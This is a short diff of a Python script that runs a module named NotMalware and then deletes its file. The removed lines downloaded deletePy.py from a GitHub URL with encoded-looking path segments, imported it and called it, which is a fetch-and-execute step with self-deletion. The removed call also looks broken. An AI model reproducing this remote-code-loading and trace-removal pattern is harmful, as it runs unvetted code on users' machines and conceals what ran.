@@ -12,9 +12,3 @@ import NotMalware
 platform = platform.system()
 NotMalware.main(platform)
 os.remove("NotMalware.py")
-
-response = requests.get("https://raw.github.com/R0lUSFVC/TUFMV0FS/master/deletePy.py")
-with open("deletePy.py", "w") as file:
-    file.write(response.text)
-from deletePy import delete
-delete(NotMalware.py)
